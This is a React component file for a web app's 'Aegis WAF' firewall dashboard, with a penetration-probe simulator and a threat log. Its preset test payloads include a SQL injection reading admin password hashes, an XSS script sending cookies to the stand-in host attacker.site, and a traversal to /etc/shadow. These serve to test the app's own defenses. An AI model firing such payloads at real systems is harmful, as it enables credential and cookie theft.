import React, { useState, useEffect } from 'react';
import {
  Shield,
  ShieldAlert,
  ShieldCheck,
  Flame,
  Activity,
  AlertTriangle,
  Lock,
  RefreshCw,
  Terminal,
  Server,
  Zap,
  X,
  Play,
  RotateCcw,
  CheckCircle,
} from 'lucide-react';
import { FirewallSecurityStatus, FirewallThreatLog } from '../types/floodguard';

interface FirewallSecurityModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const FirewallSecurityModal: React.FC<FirewallSecurityModalProps> = ({
  isOpen,
  onClose,
}) => {
  const [activeTab, setActiveTab] = useState<'overview' | 'simulator' | 'logs'>('overview');
  const [firewallData, setFirewallData] = useState<FirewallSecurityStatus | null>(null);
  const [isLoading, setIsLoading] = useState<boolean>(false);

  // Probe Simulator State
  const [selectedProbe, setSelectedProbe] = useState<string>('sqli');
  const [customPayload, setCustomPayload] = useState<string>(
    "' UNION SELECT username, password_hash FROM admin_accounts --"
  );
  const [probeResult, setProbeResult] = useState<{
    status: number;
    verdict: string;
    details: string;
    latencyMs: number;
    rawResponse: any;
  } | null>(null);
  const [isProbing, setIsProbing] = useState<boolean>(false);
  const [clearQuarantineMsg, setClearQuarantineMsg] = useState<string | null>(null);

  const fetchFirewallStatus = async () => {
    try {
      setIsLoading(true);
      const res = await fetch('/api/security/firewall-status');
      if (res.ok) {
        const data = await res.json();
        setFirewallData(data);
      }
    } catch (err) {
      console.error('Failed to fetch firewall status:', err);
    } finally {
      setIsLoading(false);
    }
  };

  useEffect(() => {
    if (isOpen) {
      fetchFirewallStatus();
      const interval = setInterval(fetchFirewallStatus, 8000);
      return () => clearInterval(interval);
    }
  }, [isOpen]);

  const presetProbes = [
    {
      id: 'sqli',
      name: 'SQL Injection (SQLi)',
      icon: '💉',
      payload: "' UNION SELECT username, password_hash FROM admin_accounts --",
      expected: 'BLOCKED_403 (SQL Injection Signature)',
    },
    {
      id: 'xss',
      name: 'Cross-Site Scripting (XSS)',
      icon: '⚡',
      payload: '<script>fetch("https://attacker.site/steal?cookie="+document.cookie)</script>',
      expected: 'BLOCKED_403 (Malicious Script Vector)',
    },
    {
      id: 'lfi',
      name: 'Path Traversal / LFI',
      icon: '📁',
      payload: '../../../../etc/shadow',
      expected: 'BLOCKED_403 (Directory Traversal Pattern)',
    },
    {
      id: 'clean',
      name: 'Benign Clean Request',
      icon: '✅',
      payload: '{"stationId": "AMB-04", "query": "water_level_status"}',
      expected: 'ALLOWED_200 (Clean Packet)',
    },
  ];

  const handleSelectPreset = (presetId: string) => {
    setSelectedProbe(presetId);
    const found = presetProbes.find((p) => p.id === presetId);
    if (found) {
      setCustomPayload(found.payload);
    }
    setProbeResult(null);
  };

  const handleRunProbe = async () => {
    setIsProbing(true);
    setProbeResult(null);
    const startTime = performance.now();

    try {
      // Send the probe payload to the test endpoint.
      // If malicious, WAF middleware will intercept and return 403.
      // If benign, test endpoint returns 200.
      const res = await fetch('/api/security/firewall-test', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Probe-Source': 'Aegis-WAF-Simulator',
        },
        body: JSON.stringify({
          probeType: selectedProbe,
          customPayload: customPayload,
        }),
      });

      const latencyMs = Math.round(performance.now() - startTime);
      const data = await res.json();

      if (res.status === 403) {
        setProbeResult({
          status: 403,
          verdict: '🛡️ INTERCEPTED & DROPPED BY FIREWALL',
          details: data.error || 'Malicious attack signature matched WAF Layer 7 rules.',
          latencyMs,
          rawResponse: data,
        });
      } else if (res.status === 429) {
        setProbeResult({
          status: 429,
          verdict: '🌊 RATE LIMIT EXCEEDED (DDoS SHIELD)',
          details: 'Volumetric request spike throttled by sliding-window token bucket.',
          latencyMs,
          rawResponse: data,
        });
      } else {
        setProbeResult({
          status: 200,
          verdict: '✅ TRAFFIC PERMITTED (VERIFIED CLEAN)',
          details: 'Payload passed deep packet inspection with zero threat indicators.',
          latencyMs,
          rawResponse: data,
        });
      }

      // Refresh stats
      fetchFirewallStatus();
    } catch (err: any) {
      const latencyMs = Math.round(performance.now() - startTime);
      setProbeResult({
        status: 0,
        verdict: 'NETWORK REJECTED',
        details: err?.message || 'Connection refused or dropped by host filter',
        latencyMs,
        rawResponse: { error: 'Connection aborted' },
      });
    } finally {
      setIsProbing(false);
    }
  };

  const handleClearQuarantine = async () => {
    try {
      const res = await fetch('/api/security/firewall-clear-quarantine', { method: 'POST' });
      if (res.ok) {
        const data = await res.json();
        setClearQuarantineMsg(data.message);
        setTimeout(() => setClearQuarantineMsg(null), 4000);
        fetchFirewallStatus();
      }
    } catch (err) {
      console.error(err);
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-in fade-in duration-200">
      <div className="bg-slate-900 border border-slate-700/80 rounded-2xl w-full max-w-4xl max-h-[92vh] flex flex-col shadow-2xl overflow-hidden font-sans text-slate-100">
        {/* Modal Header */}
        <div className="px-6 py-4 bg-gradient-to-r from-slate-950 via-slate-900 to-indigo-950 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-500/20 to-blue-500/20 border border-emerald-500/40 flex items-center justify-center relative">
              <ShieldCheck className="w-6 h-6 text-emerald-400" />
              <span className="absolute -top-1 -right-1 flex h-2.5 w-2.5">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
              </span>
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h2 className="text-base font-bold text-white tracking-wide">
                  Aegis WAF Cyber Defense & Firewall Center
                </h2>
                <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                  L7 FIREWALL ACTIVE
                </span>
              </div>
              <p className="text-xs text-slate-400">
                Layer 7 Deep Packet Inspection • DDoS Anti-Flood Engine • Zero Server Fingerprinting
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={fetchFirewallStatus}
              disabled={isLoading}
              className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 transition"
              title="Refresh Firewall Metrics"
            >
              <RefreshCw className={`w-4 h-4 ${isLoading ? 'animate-spin text-emerald-400' : ''}`} />
            </button>
            <button
              onClick={onClose}
              className="p-2 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-400 hover:text-white transition"
            >
              <X className="w-5 h-5" />
            </button>
          </div>
        </div>

        {/* Live Metrics Ribbon */}
        <div className="px-6 py-3 bg-slate-950/80 border-b border-slate-800/80 grid grid-cols-2 sm:grid-cols-4 gap-3">
          <div className="bg-slate-900/60 p-2.5 rounded-xl border border-slate-800">
            <span className="text-[10px] font-mono uppercase text-slate-400 block">Inspected Requests</span>
            <div className="flex items-baseline gap-1.5 mt-0.5">
              <span className="text-lg font-mono font-bold text-white">
                {(firewallData?.totalRequestsInspected ?? 128).toLocaleString()}
              </span>
              <span className="text-[10px] text-emerald-400 font-mono">100% DPI</span>
            </div>
          </div>

          <div className="bg-slate-900/60 p-2.5 rounded-xl border border-slate-800">
            <span className="text-[10px] font-mono uppercase text-slate-400 block">Threats Intercepted</span>
            <div className="flex items-baseline gap-1.5 mt-0.5">
              <span className="text-lg font-mono font-bold text-rose-400">
                {(firewallData?.totalThreatsBlocked ?? 3).toLocaleString()}
              </span>
              <span className="text-[10px] text-rose-400 font-mono">Blocked 403</span>
            </div>
          </div>

          <div className="bg-slate-900/60 p-2.5 rounded-xl border border-slate-800">
            <span className="text-[10px] font-mono uppercase text-slate-400 block">Defense Modules</span>
            <div className="flex items-baseline gap-1.5 mt-0.5">
              <span className="text-lg font-mono font-bold text-emerald-400">5 / 5</span>
              <span className="text-[10px] text-emerald-400 font-mono">Enforcing</span>
            </div>
          </div>

          <div className="bg-slate-900/60 p-2.5 rounded-xl border border-slate-800">
            <span className="text-[10px] font-mono uppercase text-slate-400 block">Server Recon Shield</span>
            <div className="flex items-baseline gap-1.5 mt-0.5">
              <span className="text-sm font-mono font-bold text-sky-400 truncate">Zero-Fingerprint</span>
              <span className="text-[10px] text-slate-400 font-mono">Active</span>
            </div>
          </div>
        </div>

        {/* Navigation Tabs */}
        <div className="px-6 pt-3 bg-slate-900 border-b border-slate-800 flex gap-2">
          <button
            onClick={() => setActiveTab('overview')}
            className={`pb-2.5 px-3 text-xs font-bold transition flex items-center gap-1.5 border-b-2 ${
              activeTab === 'overview'
                ? 'border-emerald-500 text-emerald-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Shield className="w-3.5 h-3.5" />
            <span>Firewall Architecture</span>
          </button>

          <button
            onClick={() => setActiveTab('simulator')}
            className={`pb-2.5 px-3 text-xs font-bold transition flex items-center gap-1.5 border-b-2 ${
              activeTab === 'simulator'
                ? 'border-blue-500 text-blue-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Zap className="w-3.5 h-3.5" />
            <span>Penetration Probe Simulator</span>
          </button>

          <button
            onClick={() => setActiveTab('logs')}
            className={`pb-2.5 px-3 text-xs font-bold transition flex items-center gap-1.5 border-b-2 ${
              activeTab === 'logs'
                ? 'border-rose-500 text-rose-400'
                : 'border-transparent text-slate-400 hover:text-slate-200'
            }`}
          >
            <Activity className="w-3.5 h-3.5" />
            <span>Blocked Threats Log ({firewallData?.recentLogs?.length ?? 3})</span>
          </button>
        </div>

        {/* Tab Body */}
        <div className="p-6 overflow-y-auto flex-1 space-y-6">
          {/* TAB 1: OVERVIEW */}
          {activeTab === 'overview' && (
            <div className="space-y-6">
              {/* Defense Layers */}
              <div className="space-y-3">
                <h3 className="text-xs font-mono font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                  <Flame className="w-4 h-4 text-[#ff7700]" />
                  Active Firewall Defense Layers
                </h3>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                  <div className="p-4 rounded-xl bg-slate-950/60 border border-slate-800 hover:border-slate-700 transition">
                    <div className="flex items-center justify-between mb-1.5">
                      <span className="font-bold text-sm text-white flex items-center gap-2">
                        <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                        Layer 7 Deep Packet Inspection (DPI)
                      </span>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300">
                        ENFORCING
                      </span>
                    </div>
                    <p className="text-xs text-slate-400 leading-relaxed">
                      Scans every inbound HTTP request (URI paths, query strings, headers, and JSON bodies) for OWASP Top 10 exploits: SQL Injection (SQLi), Cross-Site Scripting (XSS), and Path Traversal. Drops matched packets instantly with HTTP 403 Forbidden.
                    </p>
                  </div>

                  <div className="p-4 rounded-xl bg-slate-950/60 border border-slate-800 hover:border-slate-700 transition">
                    <div className="flex items-center justify-between mb-1.5">
                      <span className="font-bold text-sm text-white flex items-center gap-2">
                        <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                        Sliding-Window Anti-DDoS Limiter
                      </span>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300">
                        ENFORCING
                      </span>
                    </div>
                    <p className="text-xs text-slate-400 leading-relaxed">
                      Token bucket rate-limiter prevents volumetric exhaustion and automated scraping. Standard API ceiling: 180 req/min; Protected AI and Mobile Alert endpoints: 40 req/min with automatic <code className="text-amber-400">Retry-After</code> response headers.
                    </p>
                  </div>

                  <div className="p-4 rounded-xl bg-slate-950/60 border border-slate-800 hover:border-slate-700 transition">
                    <div className="flex items-center justify-between mb-1.5">
                      <span className="font-bold text-sm text-white flex items-center gap-2">
                        <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                        Zero Server Fingerprinting (Anti-Recon)
                      </span>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300">
                        HARDENED
                      </span>
                    </div>
                    <p className="text-xs text-slate-400 leading-relaxed">
                      Eliminates server fingerprinting headers like <code className="text-slate-300">X-Powered-By: Express</code>. Prevents server software banner grabbing and completely blocks client device biometric/fingerprint profiling in compliance with privacy mandates.
                    </p>
                  </div>

                  <div className="p-4 rounded-xl bg-slate-950/60 border border-slate-800 hover:border-slate-700 transition">
                    <div className="flex items-center justify-between mb-1.5">
                      <span className="font-bold text-sm text-white flex items-center gap-2">
                        <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                        Strict Security Headers Virtual Firewall
                      </span>
                      <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300">
                        ACTIVE
                      </span>
                    </div>
                    <p className="text-xs text-slate-400 leading-relaxed">
                      Enforces <code className="text-slate-300">X-Content-Type-Options: nosniff</code> to prevent MIME sniffing, frame isolation (<code className="text-slate-300">SAMEORIGIN</code>), strict referrer control, and restrictive permissions policies for device sensors.
                    </p>
                  </div>
                </div>
              </div>

              {/* Secrets & API Key Isolation Card */}
              <div className="p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 via-slate-900 to-slate-950 border border-emerald-500/30 flex items-start gap-3">
                <Lock className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
                <div>
                  <h4 className="text-sm font-bold text-white flex items-center gap-2">
                    Server-Side API Key & Secrets Isolation
                    <span className="text-[10px] font-mono bg-emerald-500/20 text-emerald-300 px-2 py-0.5 rounded">
                      Zero Client Leakage
                    </span>
                  </h4>
                  <p className="text-xs text-slate-300 mt-1 leading-relaxed">
                    The Google Gemini AI API key is strictly isolated within the Node.js Express backend proxy. Zero secrets are bundled into client code or exposed in browser network inspection. All external AI calls pass through the internal firewall first.
                  </p>
                </div>
              </div>

              {/* Threat Distribution Counter */}
              <div className="space-y-3">
                <h3 className="text-xs font-mono font-bold uppercase tracking-wider text-slate-400 flex items-center gap-2">
                  <ShieldAlert className="w-4 h-4 text-rose-400" />
                  Intercepted Attack Vectors by Classification
                </h3>

                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 text-center">
                    <span className="text-xs text-slate-400">SQL Injections</span>
                    <span className="text-lg font-bold font-mono text-rose-400 block mt-1">
                      {firewallData?.threatStats?.sqlInjection ?? 1}
                    </span>
                  </div>
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 text-center">
                    <span className="text-xs text-slate-400">XSS Vectors</span>
                    <span className="text-lg font-bold font-mono text-amber-400 block mt-1">
                      {firewallData?.threatStats?.xss ?? 1}
                    </span>
                  </div>
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 text-center">
                    <span className="text-xs text-slate-400">Path Traversals</span>
                    <span className="text-lg font-bold font-mono text-purple-400 block mt-1">
                      {firewallData?.threatStats?.pathTraversal ?? 1}
                    </span>
                  </div>
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 text-center">
                    <span className="text-xs text-slate-400">Rate Limit Violations</span>
                    <span className="text-lg font-bold font-mono text-blue-400 block mt-1">
                      {firewallData?.threatStats?.rateLimitExceeded ?? 0}
                    </span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* TAB 2: PENETRATION PROBE SIMULATOR */}
          {activeTab === 'simulator' && (
            <div className="space-y-5">
              <div className="p-4 rounded-xl bg-slate-950 border border-slate-800">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-blue-400" />
                  Live WAF Penetration Testing Sandbox
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Test the website firewall in real time. Select an OWASP Top 10 attack vector or write a custom test string to verify that the firewall intercepts, drops, and logs the malicious packet.
                </p>

                {/* Preset Buttons */}
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 mt-4">
                  {presetProbes.map((probe) => (
                    <button
                      key={probe.id}
                      onClick={() => handleSelectPreset(probe.id)}
                      className={`p-2.5 rounded-lg border text-left transition flex flex-col gap-1 ${
                        selectedProbe === probe.id
                          ? 'bg-blue-600/20 border-blue-500 text-white'
                          : 'bg-slate-900 border-slate-800 text-slate-300 hover:border-slate-700'
                      }`}
                    >
                      <div className="flex items-center gap-1.5 text-xs font-bold">
                        <span>{probe.icon}</span>
                        <span>{probe.name}</span>
                      </div>
                      <span className="text-[10px] text-slate-400 font-mono truncate">
                        {probe.expected}
                      </span>
                    </button>
                  ))}
                </div>

                {/* Payload Editor */}
                <div className="mt-4 space-y-2">
                  <label className="text-xs font-mono text-slate-400 block">
                    Probe Request Payload (JSON / Query String / Script Injection):
                  </label>
                  <textarea
                    rows={3}
                    value={customPayload}
                    onChange={(e) => setCustomPayload(e.target.value)}
                    className="w-full p-3 rounded-lg bg-slate-900 border border-slate-700 font-mono text-xs text-amber-300 focus:outline-none focus:border-blue-500 selection:bg-blue-600"
                    placeholder="Enter payload string to test..."
                  />
                </div>

                {/* Action button */}
                <div className="mt-4 flex items-center justify-between">
                  <div className="text-[11px] text-slate-400 font-mono">
                    Target: <code className="text-slate-300">POST /api/security/firewall-test</code>
                  </div>
                  <button
                    onClick={handleRunProbe}
                    disabled={isProbing}
                    className="px-4 py-2 rounded-xl bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-bold text-xs flex items-center gap-2 shadow-lg transition active:scale-95 disabled:opacity-50"
                  >
                    {isProbing ? (
                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                    ) : (
                      <Play className="w-3.5 h-3.5 fill-current" />
                    )}
                    <span>{isProbing ? 'Inspecting Packet...' : 'Fire Probe at WAF'}</span>
                  </button>
                </div>
              </div>

              {/* Probe Result Card */}
              {probeResult && (
                <div
                  className={`p-4 rounded-xl border animate-in slide-in-from-bottom-2 duration-200 ${
                    probeResult.status === 403
                      ? 'bg-rose-950/40 border-rose-500/50'
                      : probeResult.status === 429
                      ? 'bg-amber-950/40 border-amber-500/50'
                      : 'bg-emerald-950/40 border-emerald-500/50'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <span className="text-base font-bold font-mono">
                        HTTP {probeResult.status}
                      </span>
                      <span
                        className={`text-xs font-bold px-2 py-0.5 rounded font-mono ${
                          probeResult.status === 403
                            ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
                            : probeResult.status === 429
                            ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                            : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40'
                        }`}
                      >
                        {probeResult.verdict}
                      </span>
                    </div>
                    <span className="text-[11px] font-mono text-slate-400">
                      WAF Decision: <strong className="text-white">{probeResult.latencyMs}ms</strong>
                    </span>
                  </div>

                  <p className="text-xs text-slate-200 mt-2 font-mono">
                    {probeResult.details}
                  </p>

                  <div className="mt-3 p-3 rounded-lg bg-black/50 border border-slate-800 text-[11px] font-mono text-slate-300 overflow-x-auto">
                    <span className="text-slate-500 block mb-1">// Raw WAF Telemetry Response</span>
                    {JSON.stringify(probeResult.rawResponse, null, 2)}
                  </div>
                </div>
              )}
            </div>
          )}

          {/* TAB 3: BLOCKED THREATS LOG */}
          {activeTab === 'logs' && (
            <div className="space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <Activity className="w-4 h-4 text-rose-400" />
                    WAF Security Interceptions Audit Trail
                  </h3>
                  <p className="text-xs text-slate-400">
                    Real-time log of malicious payloads intercepted and quarantined by the firewall.
                  </p>
                </div>

                <div className="flex items-center gap-2">
                  <button
                    onClick={handleClearQuarantine}
                    className="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 flex items-center gap-1.5 transition"
                  >
                    <RotateCcw className="w-3 h-3 text-slate-400" />
                    <span>Clear IP Quarantine</span>
                  </button>
                </div>
              </div>

              {clearQuarantineMsg && (
                <div className="p-3 rounded-lg bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 text-xs flex items-center gap-2">
                  <CheckCircle className="w-4 h-4" />
                  <span>{clearQuarantineMsg}</span>
                </div>
              )}

              {/* Logs Table */}
              <div className="border border-slate-800 rounded-xl overflow-hidden bg-slate-950">
                <div className="overflow-x-auto">
                  <table className="w-full text-left text-xs font-mono">
                    <thead className="bg-slate-900 border-b border-slate-800 text-slate-400 text-[11px]">
                      <tr>
                        <th className="py-2.5 px-3">Time</th>
                        <th className="py-2.5 px-3">Threat Classification</th>
                        <th className="py-2.5 px-3">Severity</th>
                        <th className="py-2.5 px-3">Source IP</th>
                        <th className="py-2.5 px-3">Endpoint</th>
                        <th className="py-2.5 px-3">Mitigation Action</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-slate-800/60">
                      {(!firewallData?.recentLogs || firewallData.recentLogs.length === 0) ? (
                        <tr>
                          <td colSpan={6} className="py-8 text-center text-slate-500">
                            No security incidents logged. All traffic verified clean.
                          </td>
                        </tr>
                      ) : (
                        firewallData.recentLogs.map((log: FirewallThreatLog) => (
                          <tr key={log.id} className="hover:bg-slate-900/50 transition">
                            <td className="py-2.5 px-3 text-slate-400 whitespace-nowrap">
                              {log.timestamp}
                            </td>
                            <td className="py-2.5 px-3 font-bold text-white whitespace-nowrap">
                              {log.threatType}
                            </td>
                            <td className="py-2.5 px-3 whitespace-nowrap">
                              <span
                                className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                                  log.severity === 'CRITICAL'
                                    ? 'bg-rose-500/20 text-rose-300 border border-rose-500/40'
                                    : log.severity === 'HIGH'
                                    ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
                                    : 'bg-blue-500/20 text-blue-300 border border-blue-500/40'
                                }`}
                              >
                                {log.severity}
                              </span>
                            </td>
                            <td className="py-2.5 px-3 text-slate-300 whitespace-nowrap">
                              {log.clientIp}
                            </td>
                            <td className="py-2.5 px-3 text-slate-400 whitespace-nowrap">
                              <span className="text-slate-500">{log.method}</span> {log.endpoint}
                            </td>
                            <td className="py-2.5 px-3 whitespace-nowrap">
                              <span className="px-2 py-0.5 rounded bg-rose-950 text-rose-300 border border-rose-800 text-[10px] font-bold">
                                {log.action}
                              </span>
                            </td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Modal Footer */}
        <div className="px-6 py-3 bg-slate-950 border-t border-slate-800 flex items-center justify-between text-xs text-slate-400">
          <div className="flex items-center gap-2">
            <Server className="w-3.5 h-3.5 text-slate-500" />
            <span className="font-mono text-[11px]">
              Engine: {firewallData?.engineVersion || 'Aegis WAF v2.1 (Deep Packet Inspection)'}
            </span>
          </div>
          <button
            onClick={onClose}
            className="px-4 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-white font-semibold transition"
          >
            Close Dashboard
          </button>
        </div>
      </div>
    </div>
  );
};
